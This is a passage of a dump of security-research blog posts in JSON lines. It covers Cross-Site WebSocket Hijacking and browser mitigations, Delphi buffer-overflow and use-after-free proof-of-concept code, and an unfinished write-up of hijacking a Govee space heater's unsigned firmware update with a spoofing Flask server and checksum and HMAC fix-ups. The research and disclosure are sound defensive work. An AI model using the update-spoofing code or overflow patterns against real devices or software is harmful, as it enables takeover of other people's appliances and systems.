helpfully attaches the user’s cookies authenticating to bank.com. Now attacker.com can send arbitrary WebSocket messages to bank.com while masquerading as the user.\nThe impact is similar to a Cross-Site Request Forgery (CSRF) attack, but more powerful since it’s two-way: the malicious site can also read the responses to malicious requests. Normally a CSRF attack can’t read the server’s responses – unless the targeted server supports Cross-Origin Resource Sharing (CORS) requests, allows included credentials, and is misconfigured to reflect an attacker-controlled origin in the Access-Control-Allow-Origin response header.\nCSWSH Mitigation\nThe definitive way to mitigate CSWSH is that the WebSocket server should first check the Origin of the WebSocket handshake request. If the request does not come from a trusted and expected Origin, then the WebSocket handshake should fail. “Missing Origin Validation in WebSockets” has its own Common Weakness Enumeration CWE-1385.\nCSRF attacks are often addressed by attaching a pseudo-random CSRF token in the request HTTP header. The server can compare the header value to a CSRF token stored in a cookie (double submit cookie pattern). But this is harder to achieve with WebSocket handshakes due to an oddity with the WebSocket protocol that means you can’t set arbitrary headers. There are some workarounds such as putting a token in the Sec-WebSocket-Protocol header or authenticating in the first WebSocket message.\nCSWSH Prerequisites\nThere are a number of prerequisites for a CSWSH attack to work:\n1) The app uses cookie-based authentication\n2) The authentication cookie is set to SameSite=None\n3) The WebSocket server does not validate the Origin of the Websocket handshake request (and does not use another means to validate the source of requests, such as authenticating in the first WebSocket message).\nThis seems like a lot of things that have to line up, but CSWSH has been more common than I expected. If I had to speculate:\n1) Cookies are still fairly popular compared to token auth.\n2) Authentication services often operate across different origins forcing session cookies to use SameSite=None and to rely on CSRF tokens as the main mechanism to defeat CSRF, which aren’t applied to WebSocket handshakes.\n3) The ws library for Nodejs and for other common webapp frameworks don’t enforce validating the Origin.\nMitigations\nNow let’s discuss current browser security measures and how these make CSWSH attacks harder to achieve than they used to be. We’ll cover three different existing mitigations that can prevent CSWSH attacks, with a brief case study following each one describing how the mitigation affected the exploitability of CSWSH.\nSameSite=Lax by default\nSameSite=Lax by default is a longstanding and effective browser default that affects CSWSH attacks. If a SameSite setting is not explicitly configured on a cookie, then Chrome has configured it SameSite=Lax by default since 2020. SameSite=Lax means that browsers will send cookies in cross-site requests only for GET requests that resulted from a top-level navigation by the user, like clicking a link.\nThis has done a lot to make CSRF and CSWSH attacks harder to pull off by default. Note that not all browsers set SameSite=Lax by default. Firefox tried but too many sites broke, and so Firefox relies more on Total Cookie Protection described below instead. Safari also doesn’t use SameSite=Lax by default, but similarly to Firefox, also blocks third-party cookies. Microsoft Edge, being based on Chromium, follows the same behavior as Chrome.\nDue to breakage of SSO logins during rollout, back in 2020 Chrome rolled out a temporary measure making default SameSite=Lax work slightly differently to a cookie that has explicitly been set to SameSite=Lax by the backend application. For implicit SameSite=Lax, there is a two minute grace period after the cookie is issued where cookies are still sent with top-level cross-site POST requests. As described by PortSwigger, there’s scenarios where this enables a bypass of the SameSite protection. I verified that this two minute grace period still exists, in both Chrome and Firefox. However, it does not apply to CSWSH attacks, since WebSocket handshakes are not top-level POST requests. Therefore SameSite needs to explicitly be set to None for CSWSH attacks to work, no other value for SameSite will allow CSWSH to operate.\nCase Study A\nThis was a 2021 engagement I did against a website that implemented a WebSocket API for making changes to a document. Session cookies did not set a SameSite attribute. At the time, this enabled a CSWSH attack in Firefox, but not in Chrome, due to SameSite=Lax by default. An attacker could use CSWSH to make arbitrary modifications to users’ documents. The attack worked when we found it, but today the attack would no longer work in Firefox either due to Total Cookie Protection.\nSo what is Total Cookie Protection?\nOver the past several years Firefox has been locking down their “Enhanced Tracking Protection” feature. It’s unclear exactly when, but sometime in 2022-2024 “Total Cookie Protection” was enabled by default for the whole userbase, and this is really effective at blocking CSWSH.\nTotal Cookie Protection works by isolating cookies to the site in which they are created. Essentially each site has its own cookie storage partition to prevent third parties linking a user’s browsing history together. This is designed to prevent a tracker.com script loaded on site A to set a cookie which can be read by a tracker.com script loaded on site B.\nIt also has the side-effect of stopping cookie-based CSWSH. A malicious site cannot perform a successful cross-site WebSocket handshake with a user’s cookie, since that cookie is outside the current cookie storage partition. This applies even if the cookie is configured as SameSite=None.\nTotal Cookie Protection can be disabled in Firefox’s Browser Privacy settings, by selecting the “Custom” mode for “Enhanced Tracking Protection”, then unchecking the Cookies setting or changing to the old default “Cross-site tracking cookies”.\nNote that Google has been announcing the blocking of third party cookies in Chrome by default for years but have kept delaying for various reasons. The latest target was early 2025, but they changed plans in July 2024. It’s straightforward to configure in the “Privacy and security” settings, though, and this setting is enabled by default within Incognito Mode. Some distributions, notably Chromium on Debian Linux, have the default set to “Block third-party cookies”.\nCase Study B\nThis engagement was against a large web application with a GraphQL API and SameSite=None cookies. Direct CSRF against the GraphQL API wasn’t possible due to the server enforcing the application/json Content-Type, which triggers preflighted requests from the browser. However, the GraphQL API could also be called through a WebSocket. The WebSocket was vulnerable to CSWSH, enabling arbitrary API calls to be made by a third-party attacker, including all account operations such as deleting a user’s account.\nThis vulnerability would now be unexploitable in default Firefox due to Total Cookie Protection, but is still currently exploitable in default Chrome/Edge.\nPrivate Network Access\nWe’ve looked at two typical CSWSH scenarios; now for a more unusual one that came up in a client assessment. Let’s start with the case study, since it gives context on a situation where cookies were not used for authentication.\nCase Study C\nThis engagement was against a network device with a camera. A design decision was that users on the same network could access the camera and perform limited configuration without further authentication. Being on the same private network was considered adequate authentication (cookies were not required). A WebSocket API which was vulnerable to CSWSH was added to the device. Now, malicious websites on the Internet could stream video from the devices and configure them, through the medium of a targeted user’s browser who was connected to the private network.\nWhile reviewing this attack against a WebSocket server on a private IP address, I expected it to no longer work in recent versions of Chrome due to Private Network Access (apparently enforced since Chrome 130, I found it wasn’t enforced by default in Chromium 134 on Debian Linux).\nThe Private Network Access specification acknowledges that an increasing amount of services run on a user’s localhost and their private network, and describes a control similar to CORS to prevent public Internet resources from making unapproved requests to private resources. See for instance this incredible writeup against Tailscale.\nWithin the Private Network Access specification, IP address spaces are divided into three types: public, private, and local. A request (even a GET request) that is made from a more public to a more private address space triggers a preflight OPTIONS request that has the Access-Control-Request-Private-Network: true header attached by Chrome, and must receive a corresponding Access-Control-Allow-Private-Network: true header in the response for the main request to be sent.\nHowever, I found that CSWSH attacks against private IPs are not affected by Private Network Access. In my testing, attempts to send CSRF attacks against localhost addresses failed in Chrome, but there was no problem with opening WebSockets to more private IPs. On further thought this makes sense, and is called out in the specification, since Private Network Access uses CORS preflight requests as the protection method, and WebSockets do not follow SOP and thus do not use preflight requests.\nTesting\nTo verify all the points made above, I made a small demo app, the source code is at https://github.com/IncludeSecurity/cswsh-demo\nA small NodeJS Express server sets a SameSite=None cookie when visiting the / route. The server also exposes a POST / route, and a WebSocket handler, both of which log cookies if they are seen in the request.\nThe WebSocket server and the demo page were then hosted on separate HTTPS domains, and requests were tried on different browsers to verify if different types of CSRF and CSWSH attacks were successful. The /reflected endpoint was added to elicit the error specific to attempting a CSRF against a private IP with Private Network Access, otherwise a generic CORS error is displayed in DevTools.\nNote that inspecting DevTools for WebSockets requests can be misleading – in Chrome, cookies are not always shown in Devtools for WebSocket handshakes! Per a Chromium developer in the linked issue: “Cookie headers are appended at a lower layer in the networking code, so DevTools doesn’t always have everything. Normal HTTP requests do show cookies in DevTools, including HttpOnly cookies, because they involve a different cookie reporting path that sends the raw headers directly to DevTools.”\nConclusion\nSo to sum up:\n- SameSite=Lax which is the default for cookies in Chrome is a decent mitigation for CSWSH, so CSWSH requires SameSite=None session/auth cookies.\n- While Firefox doesn’t apply SameSite=Lax by default, Firefox’s Total Cookie Protection appears to be a complete mitigation for CSWSH.\n- The Chrome team has discussed a similar third party blocking technique for years, but still haven’t implemented it and are investigating other approaches. If they did block third party cookies by default, CSWSH would be largely eliminated.\n- Private Network Access in Chrome does not block CSWSH against private networks.\nRevisiting the three case studies:\n- A) No SameSite attribute specified on cookie -> no longer works in any major browser.\n- B) Typical CSWSH with SameSite=None cookie -> works in default Chrome but not Firefox.\n- C) CSWSH against private IP -> still works on all browsers even though my initial expectation was that it would no longer work in Chrome.\nFor defenders, adding an Origin check in the server-side WebSocket handshake handler is still the best way of defending against CSWSH attacks. This is important as while browser mitigations are slowly improving, they cannot be fully relied upon. It is still possible to perform CSWSH under the right circumstances against default Chrome, and it is possible for a user to run a browser that is configured to disable settings such as Total Cookie Protection. Similarly, it is not ideal to rely on the SameSite=Lax attribute on authentication cookies to protect against CSWSH. The cookies could later be changed to use SameSite=None as part of an unrelated code change, causing CSWSH vulnerabilities to become exploitable.", "timestamp": "2025-10-21T13:34:13.220748"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Memory Corruption in Delphi", "url": "https://blog.includesecurity.com/2025/03/memory-corruption-in-delphi/", "published": "Thu, 13 Mar 2025 18:55:16 +0000", "content": "Our team at Include Security is often asked to examine applications coded in languages that are usually considered “unsafe”, such as C and C++, due to their lack of memory safety functionality. Critical aspects of reviewing such code include identifying where bounds-checking, input validation, and pointer handling/dereferencing are happening and verifying they’re not exploitable. These types of vulnerabilities are often disregarded by developers using memory safe languages.\nIn 2023 the NSA published a paper on Software Memory Safety that included Delphi/Object Pascal in a list of “memory safe” languages. The paper caveats the statement by saying:\nMost memory safe languages recognize that software sometimes needs to perform an unsafe memory management function to accomplish certain tasks. As a result, classes or functions are available that are recognized as non-memory safe and allow the programmer to perform a potentially unsafe memory management task.\nWith that in mind, our team wanted to demonstrate how memory management could go wrong in Delphi despite being included on the aforementioned list and provide readers with a few tips on how to avoid introducing memory-related vulnerabilities in their Delphi code.\nIn this blog post, we take the first steps of investigating memory corruption in Delphi by constructing several simple proof-of-concept code examples that demonstrate memory corruption vulnerability patterns.\nWhat Is Delphi?\nDelphi is the name of a set of software development tools, as well as a dialect of the Object Pascal programming language. Delphi was originally developed by Borland, and is now developed by Embarcadero Technologies https://en.wikipedia.org/wiki/Delphi_(software). We chose to target Delphi as it is still used by some important companies, yes even top 10 Internet companies! These days Delphi and Object Pascal may be less popular than other languages, but they are still used in popular software as seen in the very extensive awesome-pascal repository list and by many companies as shown by Embarcadero in a variety of case-studies.\nThere’s also a free and open source IDE named Lazarus, which uses the Free Pascal compiler, and aims to be Delphi compatible.\nMemory Corruption and Memory Safety\nWe’d like to take a look at how memory corruption vulnerabilities could be introduced in languages other than C/C++, where such vulnerabilities are often discussed. This blog post takes the first steps in investigating what memory corruption vulnerabilities might look like in Delphi code by writing several proof-of-concept demonstrations of the types of memory corruption that often lead to vulnerabilities.\nDelphi has been claimed to be a memory-safe language in some contexts but we consider it similar to C++ in regards to memory safety. Object Pascal and Delphi support arbitrary untyped pointers and unsafe pointer arithmetic, which can intentionally or not lead to memory corruption. But rather than simply show that dereferencing an arbitrary pointer value could cause a crash, we wanted to demonstrate a couple of memory corruption patterns that commonly lead to vulnerabilities in software. The following examples were compiled in the RAD Studio Delphi IDE with all of the default compiler options.\nStack-Based Buffer Overflow\nLet’s start by trying to write a simple stack-based buffer overflow in Delphi. Note that in these following examples, the code was compiled in Win32 mode, which was the default, though the general concepts apply to other platforms as well. Here’s our first attempt at a stack-based buffer overflow:\nprocedure Overflow1; var ar: Array[0..9] of Byte; // Fixed-length array on the stack i: Integer; begin for i := 0 to 999 do begin ar[i] := $41; // Try to overflow the array end; end; // If overflow happens, returns to $41414141\nWe define an array of 10 bytes, and then try to write 1000 values to the array. When we compile and run this code, it raises an exception but doesn’t crash:\nWhy didn’t it crash? Since the array ar is defined with a static length, the compiler can insert code that does bounds-checking at runtime whenever the array is indexed. Let’s take a look at the compiled procedure (disassembled in Ghidra):\nThe code tests that the index is less than or equal to 9 and if it’s not, it calls a function that raises the exception (CMP EAX, 0x9, JBE, CALL).\nBut wait, this was the application compiled in debug mode. What happens if we compile the application in release mode?\nAh! In release mode, the compiler didn’t include the array bounds check, and the code overwrote the return address on the stack. Shown above is the Delphi debugger after returning to $41414141. Here’s the release build code, again disassembled in Ghidra:\nNo bounds check in sight. Why not? The “Range checking” (which is what caught the overflow in debug mode) and “Overflow checking” (which checks for integer overflows) compiler settings are disabled by default in release mode:\nSo here is a lesson: consider turning on all the “Runtime errors” flags in release mode when hardening a Delphi build. Of course, the added checks are likely disabled by default to avoid performance impacts.\nBut how easy is it to overflow a buffer with Range checking enabled? Well, the official Delphi documentation warns about memory corruption in a few of its system library routines:\nSystem.FillChar\nSystem.BlockRead\nSystem.BlockWrite\nSystem.Move\nNote that these are just the system library routines that clearly warn about memory corruption in their documentation; it’s not a comprehensive list of dangerous routines in Delphi.\nHere’s an example that uses Move to cause a stack buffer overflow:\nprocedure Overflow2; var ar1: Array[0..9] of Byte; // Smaller array on the stack ar2: Array[0..999] of Byte; // Larger array on the stack i: Integer; begin for i := 0 to 999 do begin ar2[i] := $41; // Fill ar2 with $41 end; Move(ar2, ar1, SizeOf(ar2)); // Oops should have been SizeOf(ar1) end; // Returns to $41414141\nThis time, we create two stack buffers, fill the bigger one with $41, then use Move to copy the bigger array into the smaller array. When we run this code, even the debug build with Range checking enabled overflows the stack buffer and returns to $41414141:\nThe Heap and Use After Free\nLet’s take a look at a couple examples of how heap-based vulnerabilities might be introduced. In these examples it was easy to cause the default heap implementation to allocate the same memory after a previous allocation had been freed by specifying allocations of the same size.\nIn this first example, we allocate a string on the heap, assign a value to it, free the string, then allocate another string which shares the same memory as the previous string. This demonstrates how reading uninitialized memory might lead to an information disclosure vulnerability. In this case, SetLength was used to set the length of a string without initializing memory.\nThe default string type in Delphi is UnicodeString; UnicodeStrings are automatically allocated on the heap.\nIn this example, Heap1c first calls Heap1a, which dynamically constructs a string, causing memory to for it to be allocated on the heap. The memory is freed as the string goes out of scope. Next, Heap1c calls Heap1b. Heap1b calls SetLength, which allocates memory for a string without initializing the heap memory, then reads the contents of the string revealing the string constructed in Heap1a.\nprocedure Heap1a; var s: String; // Unicode string variable on the stack, contents on the heap begin s := 'Super Secret'; // Assign a value to the string s := s + ' String!'; // Appending to the string re-allocates heap memory end; // Memory for s is freed as it goes out of scope procedure Heap1b; var s: String; // Unicode string variable on the stack, contents on the heap begin SetLength(s, 20); // Trigger re-allocation, does not initialize memory ShowMessage(s); // Shows 'Super Secret String!' end; procedure Heap1c; begin Heap1a; Heap1b; end;\nWhen the above code is run, the ShowMessage call produces the “Super Secret String!” in a dialog:\nIn this second heap example, memory is allocated for an object on the heap, then freed, then another object is allocated using the same heap memory. This is similar to how the same memory region was re-used by the strings in the previous example. In this case, the freed object is written to, modifying the second object. This represents a use-after-free vulnerability, where an attacker might be able to modify an object, either to obtain code execution or otherwise modify control flow.\nTmyFirstClass and TmySecondClass are two classes that contain a similar amount of data. In the procedure Heap2, obj1, an instance of TMyFirstClass is created then immediately freed. Next, obj2, an instance of TmySecondClass is created and read. Then, the freed obj1 is written to. Finally, obj2 is read again showing that it was modified by the access to obj1.\ntype […] TMyFirstClass = class(TObject) public ar: Array[0..7] of Byte; end; TMySecondClass = class(TObject) public n1: Integer; n2: Integer; end; […] implementation [...] procedure Heap2; var obj1: TMyFirstClass; obj2: TMySecondClass; begin obj1 := TMyFirstClass.Create; // Create obj1 obj1.Free; // Free obj1 obj2 := TMySecondClass.Create; // Create obj2 (occupies the same memory obj1 did) ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory obj1.ar[4] := $41; // Write to obj1 after it has been freed, actually modifying obj2 ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten obj2.Free; // Free obj2 end;\nIn the first screenshot, the dialog shows that obj2.n2 was equal to 0:\nThen, after obj1 was written to, the second dialog shows that the value of obj2.n2 was set to 65 (the decimal representation of $41):\nConclusion\nThese examples only scratch the surface of how memory corruption vulnerabilities might happen in Delphi code; future research could investigate more potentially dangerous library routines in official or common third-party libraries, how FreePascal behaves compared to Delphi, especially on different platforms (Win64, Linux, etc.), or how different heap implementations work to explore exploitability of heap memory corruption.\nBased on what we covered in this blog post, here are some suggestions for Delphi developers:\n- Avoid dangerous routines such as FillChar, BlockRead, BlockWrite, and Move; whenever they must be used, make sure to carefully check sizes using routines such as SizeOf.\n- Consider enabling the “Runtime errors” flags in the compiler options.\n- Be cautious when dynamically creating and freeing objects, paying attention to potentially unexpected code paths that could result in using objects after they have been freed.\n- Make sure to initialize newly allocated memory before it is read.\n- In general, don’t assume that Delphi as a language is inherently safer than other languages such as C/C++.\nHopefully these examples begin to demystify Delphi and Object Pascal, and also demonstrate that though memory corruption concepts are most commonly discussed in the context of C/C++, familiar vulnerabilities can be found in other languages as well.\nAppendix: Listing of Unit1.pas\nunit Unit1; interface uses Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls; type TForm1 = class(TForm) Button1: TButton; Button2: TButton; Button3: TButton; Button4: TButton; procedure Button1Click(Sender: TObject); procedure Button2Click(Sender: TObject); procedure Button3Click(Sender: TObject); procedure Button4Click(Sender: TObject); private { Private declarations } public { Public declarations } end; TMyFirstClass = class(TObject) public ar: Array[0..7] of Byte; end; TMySecondClass = class(TObject) public n1: Integer; n2: Integer; end; var Form1: TForm1; implementation {$R *.dfm} procedure Overflow1; var ar: Array[0..9] of Byte; // Fixed-length array on the stack i: Integer; begin for i := 0 to 999 do begin ar[i] := $41; // Raises an exception if dynamic bounds-checking is enabled end; end; // If overflow happens, returns to $41414141 procedure Overflow2; var ar1: Array[0..9] of Byte; // Smaller array on the stack ar2: Array[0..999] of Byte; // Larger array on the stack i: Integer; begin for i := 0 to 999 do begin ar2[i] := $41; // Fill ar2 with $41 end; Move(ar2, ar1, SizeOf(ar2)); // Oops should have been SizeOf(ar1) end; // Returns to $41414141 procedure Heap1a; var s: String; // Unicode string variable on the stack, contents on the heap begin s := 'Super Secret'; // Assign a value to the string s := s + ' String!'; // Appending to the string re-allocates heap memory end; // Memory for s is freed as it goes out of scope procedure Heap1b; var s: String; // Unicode string variable on the stack, contents on the heap begin SetLength(s, 20); // Trigger re-allocation, does not initialize memory ShowMessage(s); // Shows 'Super Secret String!' end; procedure Heap1c; begin Heap1a; Heap1b; end; procedure Heap2; var obj1: TMyFirstClass; obj2: TMySecondClass; begin obj1 := TMyFirstClass.Create; // Create obj1 obj1.Free; // Free obj1 obj2 := TMySecondClass.Create; // Create obj2 (occupies the same memory obj1 did) ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory obj1.ar[4] := $41; // Write to obj1 after it has been freed, actually modifying obj2 ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten obj2.Free; // Free obj2 end; procedure TForm1.Button1Click(Sender: TObject); begin Overflow1; end; procedure TForm1.Button2Click(Sender: TObject); begin Overflow2; end; procedure TForm1.Button3Click(Sender: TObject); begin Heap1c; end; procedure TForm1.Button4Click(Sender: TObject); begin Heap2; end; end.", "timestamp": "2025-10-21T13:34:13.752768"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Replacing a Space Heater Firmware Over WiFi", "url": "https://blog.includesecurity.com/2025/02/replacing-a-space-heater-firmware-over-wifi/", "published": "Tue, 04 Feb 2025 20:00:59 +0000", "content": "Our team has been discussing the increasing popularity of “smart” home appliances, and we decided to take a look at one from a security perspective. In this post, we will focus on one smart appliance in detail, and discuss how we exploited an unverified firmware update process to modify its firmware. This attack would be achievable by an attacker able to perform a man-in-the-middle attack on the local network. Our modified firmware demonstrates turning the appliance on and off, but really modifying firmware gives us complete control over the appliance; we could modify its physical behavior or its network communications, and we can make our modifications obvious or subtle.\nWe decided to take a look at an appliance made by Govee, a smart lighting and home appliance brand; they sell a number of home appliances with WiFi and Bluetooth connectivity and they have a phone app to manage their appliances. We chose one of their space heaters as a target:\nGoveeLife Smart Space Heater Lite [this product has since been recalled]\nWe really tried our best to work with the vendor when considering how to coordinate disclosure. The timeline involved a series of back and forth emails dating back to early 2024, wherein the vendor repeatedly pushed for more time before we went public with the vulnerability details due to the complexity and logistics of the necessary remediation actions. Check out our technical details of the vulnerability below, and stay tuned for the full timeline of vendor communications at the conclusion of this post. In late 2024, the product we discuss in this post (in addition to other similar products) was recalled by the Consumer Product Safety Division, so if you or anyone you know owns a device included in that report, please discontinue using the product and review the vendor’s guidance here.\nWith that said, lets dive right into the technical details!\nThe first thing we did after unboxing the space heater was to connect it to a test WiFi network using the Govee phone app. We immediately noticed it making some cleartext HTTP requests, one of which was checking for a firmware update:\nPOST /device/rest/devices/v1/wifiCheckVersion HTTP/1.1\nHost: app.govee.com\nAccept: text/xml,application/json;*/*\nenvId:0\nContent-Length: 158\nContent-Type: application/json\n{\"sku\":\"H7135\",\"wifiVersionHard\":\"1.02.00\",\"wifiVersionSoft\":\"1.00.09\",\"device\":\"1C:FA:D4:AD:FC:82:AA:07\", \"timezoneID\":\"\", \"yearDST\":\"2024\", \"supportDST\": 0}\nThe response contained the URL of the firmware image, which the space heater subsequently downloaded:\nHTTP/1.1 200 OK\nDate: Thu, 01 Feb 2024 19:42:34 GMT\nContent-Type: application/json; charset=utf-8\nContent-Length: 484\nConnection: keep-alive\nVary: Origin\nAccess-Control-Allow-Origin: *\nX-RTime: 17ms\nX-traceId: 0b993d00-c13a-11ee-96ed-af6a0a6dc03e\n{\"data\":{\"dst\":{\"deviceDst\":[{\"stime\":1710064800,\"etime\":1730624400,\"gmtoff1\":-25200,\"gmtoff2\":-28800}],\"timezoneID\":\"America/Los_Angeles\",\"sync\":1}},\"checkVersion\":{\"sku\":\"H7135\",\"versionHard\":\"1.02.00\",\"versionSoft\":\"1.00.13\",\"needUpdate\":true,\"downloadUrl\":\"http://s3.amazonaws.com/govee-public/upgrade-pack/62c9486b3b668992ebb413cc2ee0ad4e-H7135_CMS726_WIFI_BLE_HW1.02.00_SW1.00.13_OTA.bin\",\"md5\":\"3b668992ebb413cc\",\"size\":874820,\"time\":28446943},\"message\":\"success\",\"status\":200}\nThis raised some questions – is this OTA (over-the-air) update scheme secured at all? Can we hijack the HTTP connections made to check and update the firmware, in order to run our own modified firmware?\nSpoiler alert: we can, but it takes a few steps to get there.\nTaking it apart\nHere’s the space heater, with lid on and off:\nIn the second picture, you can see the touch sensor buttons, and locations of the LEDs. This is what the main board looks like, removed from the rest of the enclosure:\nThe primary controller on the main board, which runs the firmware we downloaded, is a WiFi and Bluetooth module, visible on the left. It communicates with another microcontroller, visible in the center of the main board over a serial UART; this secondary microcontroller drives the LEDs, buttons, heater, fan, and so on.\nUnderneath the main board is the rest of the non-”smart” space heater functionality, and a power supply:\nHere’s a closeup of the WiFi/Bluetooth module:\nThere isn’t any visible labeling in this photo, however we were able to identify the module from this string in the firmware image:\nAmebaZIIRTL8710C\nThis string identifies the module as an Ameba Z2 module, based on the RTL8710 Realtek SoC. This is one of a family of Realtek WiFi and Bluetooth modules based on the RTL8710. If you’re familiar with the popular Espressif ESP8266 modules, these are competitors. For a bit more information: NEW CHIP ALERT: RTL8710, A CHEAPER ESP8266 COMPETITOR.\nYou may have also noticed the unpopulated header pins labeled TXD and RXD; these connect to a debugging UART on the Ameba Z2. The debugging UART outputs debug messages, and it even has a simple interactive command prompt. The “GoveeShell” prompt asks for a password, but it’s not hard to guess from a list of strings in the firmware image:\n$ strings 62c9486b3b668992ebb413cc2ee0ad4e-H7135_CMS726_WIFI_BLE_HW1.02.00_SW1.00.13_OTA.bin | grep -A 10 \"input password\"\nPlease input password:\nReturn:\n, 0x\n00000000000\nqHandle queue is NULL\n[redacted]\ndefault user\nsetVar\nset var\nright\nleft\nWith the password, we can list supported commands. Note that there was a separate thread on the module constantly dumping hex bytes from the UART connection to the secondary microcontroller, which are interspersed with the shell output:\nPlease input password:\nuart send:\n55 F7 01 4D\n81 07\nuart send:\n55 F7 02 4E\n41 01\n[redacted]\n____ ____ _ _ _\n/ ___| _____ _____ ___ / ___|| |__ ___| | |\n| | _ / _ \\ \\ / / _ \\/ _ \\ \\___ \\| '_ \\ / _ \\ | |\n| |_| | (_) \\ V / __/ __/ ___) | | | | __/ | |\n\\____|\\___/ \\_/ \\___|\\___| |____/|_| |_|\\___|_|_|\nBuild: Dec 29 2023 10:08:09\nVersion: 1.0.1\nCopyright: (c) 2020 Govee\nGovee:/$ A9 02 00 00\ncmds\nCommand List:\nsetVar CMD set var\nusers CMD list all user\ncmds CMD list all cmd\nvars CMD list all var\nkeys CMD list all key\nclear CMD clear console\nreboot CMD reboot device\ntasklist CMD get task list\ntaskinfo CMD get task info\nfree CMD get free heap\nping CMD ping - c 3 - s 32 - i 100 - w 1000 www.baidu.com\nlog CMD log print / upload / info leve\niperf CMD iperf - h\nifconfig CMD network info\nwifi CMD wifi set ssid pwd\ndate CMD date - h\ntimer CMD timer set countdown\ndev_info CMD show dev info\nGovee:/$\nModifying the Firmware\nWe wrote this simple Python Flask app to imitate the http://app.govee.com/device/rest/devices/v1/wifiCheckVersion endpoint and then redirected requests for app.govee.com to the Flask server using DNS on the test WiFi network:\n#!/usr/bin/env python from flask import Flask, make_response import hashlib import json app = Flask(__name__) FW_FILE_NAME = \"./patched-fw.bin\" HOSTNAME = \"192.168.12.1\" ORIG_JSON = '{\"data\":{\"dst\":{\"deviceDst\":[{\"stime\":0,\"etime\":0,\"gmtoff1\":0,\"gmtoff2\":0}],\"timezoneID\":\"America/Los_Angeles\",\"sync\":1}},\"checkVersion\":{\"sku\":\"H7135\",\"versionHard\":\"1.02.00\",\"versionSoft\":\"1.00.13\",\"needUpdate\":true,\"downloadUrl\":\"http://s3.amazonaws.com/govee-public/upgrade-pack/62c9486b3b668992ebb413cc2ee0ad4e-H7135_CMS726_WIFI_BLE_HW1.02.00_SW1.00.13_OTA.bin\",\"md5\":\"3b668992ebb413cc\",\"size\":874820,\"time\":0},\"message\":\"success\",\"status\":200}' @app.route('/') def index(): return \"Test\" @app.route('/device/rest/devices/v1/wifiCheckVersion', methods= ['GET', 'POST']) def check_version(): file = open(FW_FILE_NAME, \"rb\") data = file.read() file.close() md5_hash = hashlib.md5(data).hexdigest() print(md5_hash[8:-8]) print(len(data)) blob = json.loads(ORIG_JSON) blob[\"checkVersion\"][\"needUpdate\"] = True blob[\"checkVersion\"][\"downloadUrl\"] = f\"http://{HOSTNAME}/fw.bin\" blob[\"checkVersion\"][\"md5\"] = md5_hash[8:-8] blob[\"checkVersion\"][\"size\"] = len(data) return json.dumps(blob) @app.route('/fw.bin') def download_firmware(): file = open(FW_FILE_NAME, \"rb\") data = file.read() file.close() resp = make_response(data) resp.headers['Content-Type'] = 'application/octet-stream' return resp\nThe script replies with the JSON string we sniffed from the original request, except it points to our modified firmware file.\nAfter modifying a few bytes in the firmware and attempting an update using the Flask server, we saw this on the debug UART:\n[HAL_Ota_EraseUpdateRegion] flash_addr: 0xc000, len: 874820\n[update_ota_erase_upg_region] NewFWLen 874820\n[update_ota_erase_upg_region] NewFWBlkSize 214 0xc000 7F 02 00 00\n7F 02 00 00\n7F 02 00 00\n[HAL_Ota_DoChecksum] flash_addr: 0xc000, len: 874820, flash checksum 0x 59ce074, attached checksum 0x 59cdf50\n[HAL_Ota_DoChecksum] The checksume is wrong!\nERR|2024-2-5 11:13:52|_check_download_result(159): do checksum fail!\nERR|2024-2-5 11:13:52|ota_service_thread_func(298): OTA failed! Do it again\nThe message indicates a checksum failure, and the OTA update failed. This is a simple checksum; it’s just a sum of all the bytes in the firmware image appended to the end of the file. The difference between the attached and expected checksums was the same as the difference in the original and patched bytes. Once we fixed this checksum, the module was happy to flash the modified firmware image:\n[HAL_Ota_EraseUpdateRegion] flash_addr: 0xc000, len: 874820\n[update_ota_erase_upg_region] NewFWLen 874820\n[update_ota_erase_upg_region] NewFWBlkSize 214 0xc000 83 02 00 00\nuart send:\n55 F0 0E 53\n0E\n83 02 00 00\n[HAL_Ota_DoChecksum] flash_addr: 0xc000, len: 874820, flash checksum 0x 59ce074, attached checksum 0x 59ce074\n[HAL_Ota_UpdateSignature] flash_addr: 0xc000, len: 32\n[update_ota_signature] Append OTA signature NewFWAddr: 0xc000\n[update_ota_signature] signature:\nB8 5B 6A B5 DD B6 EB CB 87 08 A8 52 F2 43 6C D1\n5D 19 61 8F D9 BE BD 9E 54 32 C4 1F BE D7 3C A1 82 02 00 00\n83 02 00 00\nuart send:\n55 F0 0F 54\n0F\n83 02 00 00\n83 02 00 00\n83 02 00 00\nuart send:\n55 F0 10 55\n10\n83 02 00 00\n83 02 00 00\n83 02 00 00\nuart send:\n55 F0 11 56\n11\n83 02 00 00\n83 02 00 00\n83 02 00 00\nuart send:\n55 F0 12 57\n12\n83 02 00 00\nDevice rebooting ..\n== Rtl8710c IoT Platform ==\nChip VID: 5, Ver: 3\nROM Version: v3.0\n== Boot Loader ==\nDec 9 2020:20:15:00\n[MISC Err]Hash Result Incorrect!\nBoot Load Err!\nUnfortunately, the bootloader was unhappy with the modified firmware, and the device hung at this bootloader error on startup; the device was effectively bricked.\nOh no, it’s bricked\nAt this point, we decided to remove the module from the main board. Once it was de-soldered, we verified it still worked when powered (it still would output a bootloader message on the debug UART), and were happy to discover a silkscreened pinout on the bottom of the module:\nThe pinout was helpful, as there are various versions of these modules with slightly different pinouts.\nIn this situation, we found the open source tool ltchiptool useful to dump and flash the firmware on this particular module. This is an open-source tool made by independent contributors to support open-source development on several different embedded wireless modules. With the module removed from the main board, we were able to use the tool to dump the firmware that was presently on the device, undo the modifications we had made, and re-flash the module.\nNext, we connected some wires to the module so that we could connect its control UART back to the main board, interact with the debug UART, and still re-flash the module as needed:\nThe ltchiptool code contains a script parse_partition.py that describes the firmware file format in more detail. The firmware contains sections, each with a header that contains an HMAC-SHA256 signature of the contents which is verified by the bootloader. The module appears to support a secure-boot mode in which the HMAC key is derived from a secret value, but in this case secure-boot was disabled and the HMAC key was included in one of the headers of the firmware image. With this information it was possible to write a script to fix up the HMAC values and the simple checksum within a modified firmware 